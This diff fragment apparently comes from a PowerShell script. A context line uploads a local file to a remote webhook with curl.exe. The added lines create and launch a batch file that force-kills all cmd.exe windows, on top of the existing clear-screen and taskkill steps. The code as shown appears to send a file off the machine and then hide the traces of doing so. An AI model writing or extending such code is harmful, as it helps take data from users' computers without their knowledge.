@@ -126,5 +126,14 @@ if (-not ([string]::IsNullOrEmpty($FilePath))){
     curl.exe -F "file1=@$FilePath" $WebhookUrl
 }
 clear
+$batFilePath = "C:\Users\$env:USERNAME\closeCmd.bat"
+$batContent = @"
+timeout /t 1
+taskkill /f /im cmd.exe
+"@
+Set-Content -Path $batFilePath -Value $batContent
+Start-Process $batFilePath
+
+clear
 taskkill /f /im cmd.exe
 exit
